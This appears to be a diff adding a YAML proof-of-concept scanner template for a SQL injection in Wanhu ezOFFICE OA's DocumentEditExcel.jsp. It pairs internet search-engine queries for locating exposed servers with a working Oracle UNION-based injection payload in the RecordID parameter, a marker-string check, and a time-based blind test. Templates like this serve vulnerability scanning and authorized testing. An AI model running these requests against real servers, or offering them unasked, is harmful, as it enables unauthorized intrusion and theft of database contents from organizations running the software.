@@ -1,0 +1,54 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: oracle | 联合注入 | 时间盲注
+
+name: poc-yaml-wanhu-ezoffice-DocumentEditExcel.jsp-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            follow_redirects: false
+            path: /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp?RecordID=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(112)||CHR(98)||CHR(118)||CHR(113)||CHR(122)||CHR(114)||CHR(119)||CHR(85)||CHR(108)||CHR(66)||CHR(72)||CHR(71)||CHR(114)||CHR(77)||CHR(113)||CHR(121)||CHR(68)||CHR(79)||CHR(104)||CHR(98)||CHR(83)||CHR(88)||CHR(90)||CHR(76)||CHR(71)||CHR(87)||CHR(86)||CHR(80)||CHR(81)||CHR(100)||CHR(97)||CHR(119)||CHR(120)||CHR(122)||CHR(107)||CHR(119)||CHR(121)||CHR(75)||CHR(74)||CHR(114)||CHR(83)||CHR(112)||CHR(107)||CHR(104)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113),NULL,NULL,NULL%20FROM%20DUAL--%20FSjw
+            headers:
+            body:         
+        expression: response.status == 200 && response.body_string.contains("qpbvqzrwUlBHGrMqyDOhbSXZLGWVPQdawxzkwyKJrSpkhqvvpq")
+
+        output:
+          search: |-
+            "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+          filename: search["filename"]
+          search1: |-
+            "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+          newpath: search["newpath"]
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            follow_redirects: false
+            path: /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp?RecordID=1%27
+            headers:
+            body:         
+        expression: response.status == 200 && response.latency >= 4000
+
+expression: r0() 
